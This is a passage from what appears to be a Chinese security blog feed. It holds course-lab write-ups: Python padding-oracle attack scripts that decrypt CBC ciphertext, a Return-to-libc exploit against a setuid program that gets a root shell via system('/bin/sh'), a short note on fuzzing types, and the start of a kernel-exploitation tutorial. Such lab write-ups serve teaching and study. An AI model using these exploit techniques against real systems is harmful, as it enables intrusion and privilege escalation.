class="keyword">in</span> <span class="built_in">zip</span>(first, second))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PaddingOracle</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="variable language_">self</span>.s.connect((host, port))</span><br><span class="line"></span><br><span class="line">        ciphertext = <span class="variable language_">self</span>.s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="variable language_">self</span>.ctext = unhexlify(ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ctext: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>._send(hexlify(ctext))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._recv()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recv</span>(<span class="params">self</span>):</span><br><span class="line">        resp = <span class="variable language_">self</span>.s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="keyword">return</span> resp </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_send</span>(<span class="params">self, hexstr: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.send(hexstr + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    oracle = PaddingOracle(<span class="string">&#x27;10.9.0.80&#x27;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the IV + Ciphertext from the oracle</span></span><br><span class="line">    iv_and_ctext = <span class="built_in">bytearray</span>(oracle.ctext)</span><br><span class="line">    IV    = iv_and_ctext[<span class="number">00</span>:<span class="number">16</span>]</span><br><span class="line">    C1    = iv_and_ctext[<span class="number">16</span>:<span class="number">32</span>]  <span class="comment"># 1st block of ciphertext</span></span><br><span class="line">    C2    = iv_and_ctext[<span class="number">32</span>:<span class="number">48</span>]  <span class="comment"># 2nd block of ciphertext</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;C1:  &quot;</span> + C1.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;C2:  &quot;</span> + C2.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">    <span class="comment">###############################################################</span></span><br><span class="line">    <span class="comment"># Here, we initialize D2 with C1, so when they are XOR-ed,</span></span><br><span class="line">    <span class="comment"># The result is 0. This is not required for the attack.</span></span><br><span class="line">    <span class="comment"># Its sole purpose is to make the printout look neat.</span></span><br><span class="line">    <span class="comment"># In the experiment, we will iteratively replace these values.</span></span><br><span class="line">    D2 = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    D2[<span class="number">0</span>]  = C1[<span class="number">0</span>]</span><br><span class="line">    D2[<span class="number">1</span>]  = C1[<span class="number">1</span>]</span><br><span class="line">    D2[<span class="number">2</span>]  = C1[<span class="number">2</span>]</span><br><span class="line">    D2[<span class="number">3</span>]  = C1[<span class="number">3</span>]</span><br><span class="line">    D2[<span class="number">4</span>]  = C1[<span class="number">4</span>]</span><br><span class="line">    D2[<span class="number">5</span>]  = C1[<span class="number">5</span>]</span><br><span class="line">    D2[<span class="number">6</span>]  = C1[<span class="number">6</span>]</span><br><span class="line">    D2[<span class="number">7</span>]  = C1[<span class="number">7</span>]</span><br><span class="line">    D2[<span class="number">8</span>]  = C1[<span class="number">8</span>]</span><br><span class="line">    D2[<span class="number">9</span>]  = C1[<span class="number">9</span>]</span><br><span class="line">    D2[<span class="number">10</span>] = C1[<span class="number">10</span>]</span><br><span class="line">    D2[<span class="number">11</span>] = C1[<span class="number">11</span>]</span><br><span class="line">    D2[<span class="number">12</span>] = C1[<span class="number">12</span>]</span><br><span class="line">    D2[<span class="number">13</span>] = C1[<span class="number">13</span>]</span><br><span class="line">    D2[<span class="number">14</span>] = C1[<span class="number">14</span>]</span><br><span class="line">    D2[<span class="number">15</span>] = C1[<span class="number">15</span>]</span><br><span class="line">    <span class="comment">###############################################################</span></span><br><span class="line">    <span class="comment"># In the experiment, we need to iteratively modify CC1</span></span><br><span class="line">    <span class="comment"># We will send this CC1 to the oracle, and see its response.</span></span><br><span class="line">    CC1 = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    CC1[<span class="number">0</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">1</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">2</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">3</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">4</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">5</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">6</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">7</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">8</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">9</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">10</span>] = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">11</span>] = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">12</span>] = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">13</span>] = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">14</span>] = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">15</span>] = <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">###############################################################</span></span><br><span class="line">    <span class="comment"># In each iteration, we focus on one byte of CC1.  </span></span><br><span class="line">    <span class="comment"># We will try all 256 possible values, and send the constructed</span></span><br><span class="line">    <span class="comment"># ciphertext CC1 + C2 (plus the IV) to the oracle, and see </span></span><br><span class="line">    <span class="comment"># which value makes the padding valid. </span></span><br><span class="line">    <span class="comment"># As long as our construction is correct, there will be </span></span><br><span class="line">    <span class="comment"># one valid value. This value helps us get one byte of D2. </span></span><br><span class="line">    <span class="comment"># Repeating the method for 16 times, we get all the 16 bytes of D2.</span></span><br><span class="line"></span><br><span class="line">    K = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">          CC1[<span class="number">16</span> - K] = i</span><br><span class="line">          status = oracle.decrypt(IV + CC1 + C2)</span><br><span class="line">          <span class="keyword">if</span> status == <span class="string">&quot;Valid&quot;</span>:</span><br><span class="line">              <span class="built_in">print</span>(<span class="string">&quot;Valid: i = 0x&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">              <span class="built_in">print</span>(<span class="string">&quot;CC1: &quot;</span> + CC1.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="comment">###############################################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Once you get all the 16 bytes of D2, you can easily get P2</span></span><br><span class="line">    P2 = xor(C1, D2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;P2:  &quot;</span> + P2.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>运行后可得结果，可以看到成功解出C1末位为0xcf时，padding正确，所以可以得出D2末位为<code>0xcf xor 0x01 = 0xce</code>：</p>
<img src="/posts/8f883717/image-20231231105351823.png" class="" title="image-20231231105351823">

<p>然后修改C1末位为<code>0xce xor 0x02</code>尝试C1倒数第二位解出使padding为0x02的valid情况，得到D2后两位<code>0x3b0xce</code></p>
<img src="/posts/8f883717/image-20231231105716391.png" class="" title="image-20231231105716391">

<p>以此类推，可以得出D2值以及P2值：</p>
<img src="/posts/8f883717/image-20231231111128460.png" class="" title="image-20231231111128460">

<h2 id="5-Task-3：Padding-Oracle-Attack（Level-2）"><a href="#5-Task-3：Padding-Oracle-Attack（Level-2）" class="headerlink" title="5. Task 3：Padding Oracle Attack（Level 2）"></a>5. Task 3：Padding Oracle Attack（Level 2）</h2><p>自动化进程，并获取所有分组的密文。</p>
<p>构造脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR two bytearrays</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">first, second</span>):</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">bytearray</span>(x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(first, second))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PaddingOracle</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="variable language_">self</span>.s.connect((host, port))</span><br><span class="line"></span><br><span class="line">        ciphertext = <span class="variable language_">self</span>.s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="variable language_">self</span>.ctext = unhexlify(ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ctext: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>._send(hexlify(ctext))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._recv()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recv</span>(<span class="params">self</span>):</span><br><span class="line">        resp = <span class="variable language_">self</span>.s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="keyword">return</span> resp </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_send</span>(<span class="params">self, hexstr: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.send(hexstr + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    oracle = PaddingOracle(<span class="string">&#x27;10.9.0.80&#x27;</span>, <span class="number">6000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the IV + Ciphertext from the oracle</span></span><br><span class="line">    iv_and_ctext = <span class="built_in">bytearray</span>(oracle.ctext)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(iv_and_ctext))</span><br><span class="line">    <span class="comment"># Num of ctext</span></span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">len</span>(iv_and_ctext)/<span class="number">16</span> - <span class="number">1</span>)</span><br><span class="line">    plain_text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        C = iv_and_ctext[(n)*<span class="number">16</span>: (n+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;IV:  &quot;</span> + C.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;C<span class="subst">&#123;n&#125;</span>: &quot;</span> + C.<span class="built_in">hex</span>())</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># initialize D, IV, P</span></span><br><span class="line">        D = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        CC = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        P = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Solve D</span></span><br><span class="line">        <span class="keyword">for</span> K <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                CC[<span class="number">16</span> - K] = i</span><br><span class="line">                <span class="comment"># initialize input</span></span><br><span class="line">                tmp_input = iv_and_ctext[<span class="number">0</span>:(n+<span class="number">2</span>)*<span class="number">16</span>]</span><br><span class="line">                tmp_input[n*<span class="number">16</span>:(n+<span class="number">1</span>)*<span class="number">16</span>] = CC</span><br><span class="line">                status = oracle.decrypt(tmp_input)</span><br><span class="line">                <span class="keyword">if</span> status == <span class="string">&quot;Valid&quot;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Valid: i = 0x&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;D: &quot;</span>+ D.<span class="built_in">hex</span>())</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;CC: &quot;</span> + CC.<span class="built_in">hex</span>())</span><br><span class="line">                    <span class="comment"># Update D</span></span><br><span class="line">                    D[<span class="number">16</span> - K] = i^K</span><br><span class="line">                    <span class="comment"># Update CC</span></span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, K+<span class="number">1</span>):</span><br><span class="line">                        CC[<span class="number">16</span> - j] = D[<span class="number">16</span> - j]^(K+<span class="number">1</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Once you get all the 16 bytes of D2, you can easily get P2</span></span><br><span class="line">        P = xor(C, D)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;P:  &quot;</span> + P.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            plain_text += <span class="built_in">chr</span>(P[j])</span><br><span class="line">            </span><br><span class="line">       </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Plaintext: &quot;</span> + plain_text) </span><br></pre></td></tr></table></figure>

<img src="/posts/8f883717/image-20231231130753727.png" class="" title="image-20231231130753727">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>密码</tag>
        <tag>Padding</tag>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络攻防大作业】Return_to_libc实验报告</title>
    <url>/posts/8a8d28bf.html</url>
    <content><![CDATA[<h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h3><ul>
<li><p>修改flag为学号</p>
</li>
<li><p>构建docker镜像（运行<code>sudo ./build.sh</code>，注意<code>chmod +x</code>修改权限），连接不稳定，可能需要多次尝试</p>
</li>
<li><p>开启docker，禁用ASLR。</p>
<img src="/posts/8a8d28bf/image-20231231144427491.png" class="" title="image-20231231144427491">
</li>
<li><p>使用<code>netstat -antp</code>查看ssh服务状态</p>
<img src="/posts/8a8d28bf/image-20231231144545863.png" class="" title="image-20231231144545863">
</li>
<li><p>登录容器<code>ssh 0.0.0.0 -p 49153 -l seed</code></p>
</li>
</ul>
<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><p>运行镜像中vuln程序，vuln有setuid权限，因此可以尝试通过此来获取root shell。</p>
<img src="/posts/8a8d28bf/image-20231231145335514.png" class="" title="image-20231231145335514">

<p>查看vuln源代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *framep;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy ebp into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (framep));      </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* print out information for experiment purpose */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of buffer[] inside bof():  0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>)buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer value inside bof():  0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>)framep);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> input[<span class="number">1000</span>];</span><br><span class="line">   FILE *badfile;</span><br><span class="line"></span><br><span class="line">   badfile = fopen(<span class="string">&quot;/home/seed/the_file&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="type">int</span> length = fread(input, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">1000</span>, badfile);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Address of input[] inside main():  0x%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>) input);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Input size: %d\n&quot;</span>, length);</span><br><span class="line"></span><br><span class="line">   bof(input);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;(^_^)(^_^) Returned Properly (^_^)(^_^)\n&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现输入<code>input</code>长度可以达到1000，可以造成栈溢出攻击获取root shell。</p>
<img src="/posts/8a8d28bf/image-20231231145600873.png" class="" title="image-20231231145600873">

<p>另外发现docker镜像中已将zsh链接到sh，因此只需构造环境变量<code>/bin/sh</code>，使用<code>system(&#39;/bin/sh&#39;)</code>获取shell即可。<code>system</code>，<code>exit</code>地址如下。</p>
<img src="/posts/8a8d28bf/image-20231231152925920.png" class="" title="image-20231231152925920">

<p>根据vuln返回信息可以获取到input、buffer地址以及栈帧基址。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">seed /home/seed % vuln</span><br><span class="line">Address of input[] inside main():  0xffffd8d0</span><br><span class="line">Input size: 66</span><br><span class="line">Address of buffer[] inside bof():  0xffffd7e4</span><br><span class="line">Frame Pointer value inside bof():  0xffffd8b8</span><br></pre></td></tr></table></figure>



<p>可以计算出从buffer需要溢出<code>0xffffd8b8-0xffffd7e4 = 212</code>个字节可以溢出到ebp。然后ebp返回地址上填入system地址，并添加参数和exit返回地址即可。</p>
<p>参数<code>/bin/sh</code>尝试使用环境变量实现。</p>
<img src="/posts/8a8d28bf/image-20231231153450024.png" class="" title="image-20231231153450024">

<p>构造脚本<code>genv.c</code>获取环境变量地址，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span>* shell = getenv(<span class="string">&quot;MYSHELL&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (shell)</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)shell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译genv并上传，获取到<code>/bin/sh</code>地址<code>0xffffdfd5</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -m32 genv.c -o genv</span><br><span class="line">scp -P 49153 ./genv seed@0.0.0.0:/home/seed</span><br></pre></td></tr></table></figure>

<img src="/posts/8a8d28bf/image-20231231153928103.png" class="" title="image-20231231153928103">

<p>构造python脚本，并上传</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>))</span><br><span class="line"></span><br><span class="line">input_addr	= <span class="number">0xffffd8c0</span></span><br><span class="line">buffer_addr	= <span class="number">0xffffd7d4</span></span><br><span class="line">ebp_addr	= <span class="number">0xffffd8a8</span> </span><br><span class="line">system_addr	= <span class="number">0xf7e19360</span>   <span class="comment"># The address of system()</span></span><br><span class="line">exit_addr	= <span class="number">0xf7e0bec0</span></span><br><span class="line">sh_addr = <span class="number">0xffffdfd2</span>       <span class="comment"># The address of &quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">Y = ebp_addr - buffer_addr + <span class="number">4</span></span><br><span class="line">content[Y:Y+<span class="number">4</span>] = (system_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">X = Y + <span class="number">8</span></span><br><span class="line">content[X:X+<span class="number">4</span>] = (sh_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Z = Y + <span class="number">4</span></span><br><span class="line">content[Z:Z+<span class="number">4</span>] = (exit_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;the_file&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -P 49153 ./exp.py seed@0.0.0.0:/home/seed</span><br></pre></td></tr></table></figure>

<p>修改文件权限并执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 755 exp.py</span><br><span class="line">chmod 755 the_file</span><br><span class="line">python3 exp.py</span><br></pre></td></tr></table></figure>

<p>其中发现”&#x2F;bin&#x2F;sh”环境变量存在偏移0x3，对exp.py稍作修改后重新运行，成功获取到root shell，获取到flag。</p>
<img src="/posts/8a8d28bf/image-20231231154624159.png" class="" title="image-20231231154624159">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Return</tag>
        <tag>to</tag>
        <tag>Pwn</tag>
        <tag>libc</tag>
      </tags>
  </entry>
  <entry>
    <title>模糊测试分类</title>
    <url>/posts/34143959.html</url>
    <content><![CDATA[<p>根据程序执行反馈的获取情况，可以将模糊测试分为白盒、黑盒和灰盒三类</p>
<h2 id="一、白盒测试"><a href="#一、白盒测试" class="headerlink" title="一、白盒测试"></a>一、白盒测试</h2><p>白盒测试通过分析被测程序的内部机制和执行被测程序时收集的信息来生成测试用例，白盒测试通常会对程序进行动态污点分析或符号执行以获取精确的程序分析和状态信息。</p>
<h2 id="二、黑盒测试"><a href="#二、黑盒测试" class="headerlink" title="二、黑盒测试"></a>二、黑盒测试</h2><p>黑盒测试将测试对象当作黑盒，按照指定的规范随机生成测试用例。不提前分析程序内部机制也不接受反馈信息来更新测试用例。</p>
<h2 id="三、灰盒测试"><a href="#三、灰盒测试" class="headerlink" title="三、灰盒测试"></a>三、灰盒测试</h2><p>灰盒测试的典型特点就是可以使用目标的执行反馈来指导测试用例的生成。</p>
<img src="/posts/34143959/image-20240103104937168.png" class="" title="image-20240103104937168">]]></content>
      <tags>
        <tag>Fuzz</tag>
        <tag>模糊测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel Pwn 学习之路(一)</title>
    <url>/posts/54828bfc.html</url>
    <content><![CDATA[<p>参考链接：<a href="https://zhuanlan.zhihu.com/p/140338884">Kernel Pwn 学习之路（一）</a></p>
<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>本文主要介绍Kernel的相关知识以及栈溢出在Kernel中的利用。</p>
<h2 id="2-Kernel简介"><a href="#2-Kernel简介" class="headerlink" title="2. Kernel简介"></a>2. Kernel简介</h2><p><strong>本部分全文引用了CTF-Wiki的相关内容。</strong></p>
<h3 id="2-1-什么是Kernel"><a href="#2-1-什么是Kernel" class="headerlink" title="2.1 什么是Kernel"></a>2.1 什么是Kernel</h3><p>kernel也是一个程序，用来管理软件发出的数据I&#x2F;O请求，讲这些要求转译为指令，交给CPU和计算机中的其他组件处理，kernel是现代操作系统最基本的部分。</p>
<p>Kernel最主要的功能有以下两点：</p>
<ul>
<li>控制并与硬件进行交互</li>
<li>提供application能运行的环境</li>
</ul>
<p>包括I&#x2F;O，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。需要注意的是：<strong>kernel的crash通常会引起重启</strong></p>
<h3 id="2-2-Ring-模型"><a href="#2-2-Ring-模型" class="headerlink" title="2.2 Ring 模型"></a>2.2 Ring 模型</h3><p>intel CPU 将CPU的特权级别分为4个级别：Ring 0， Ring1，… ，Ring3。</p>
<p>Ring0只给OS使用，Ring3所有程序都可以使用，内层Ring可以随便使用外层Ring的资源。提升系统安全性</p>
<p>大多数操作系统只使用了Ring0，Ring3。</p>
<h3 id="2-3-状态切换"><a href="#2-3-状态切换" class="headerlink" title="2.3 状态切换"></a>2.3 状态切换</h3><h4 id="User-space-to-kernel-space"><a href="#User-space-to-kernel-space" class="headerlink" title="User space to kernel space"></a>User space to kernel space</h4><p>当发生系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换，具体过程为：</p>
<ol>
<li><p>通过swapgs切换GS段寄存器，将GS寄存器值和一个特定位置的值进行交换，目的是保存GS值，同时将该位置的值作为内核执行的GS值使用。</p>
</li>
<li><p>将当前栈顶（用户控件栈顶）记录在CPU独占变量区域中，将CPU独占区域里记录的内核栈顶放入RSP&#x2F;ESP</p>
</li>
<li><p>通过push保存各寄存器值，具体代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line">/* 保存栈值，并设置内核栈 */</span><br><span class="line">movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span><br><span class="line">/* Construct struct pt_regs on stack */</span><br><span class="line">pushq  $__USER_DS                /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11                      /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS                /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx                      /* pt_regs-&gt;ip */</span><br><span class="line">pushq  %rax                      /* pt_regs-&gt;orig_ax */</span><br><span class="line">pushq  %rdi                      /* pt_regs-&gt;di */</span><br><span class="line">pushq  %rsi                      /* pt_regs-&gt;si */</span><br><span class="line">pushq  %rdx                      /* pt_regs-&gt;dx */</span><br><span class="line">pushq  %rcx tuichu               /* pt_regs-&gt;cx */</span><br><span class="line">pushq  $-ENOSYS                  /* pt_regs-&gt;ax */</span><br><span class="line">pushq  %r8                       /* pt_regs-&gt;r8 */</span><br><span class="line">pushq  %r9                       /* pt_regs-&gt;r9 */</span><br><span class="line">pushq  %r10                      /* pt_regs-&gt;r10 */</span><br><span class="line">pushq  %r11                      /* pt_regs-&gt;r11 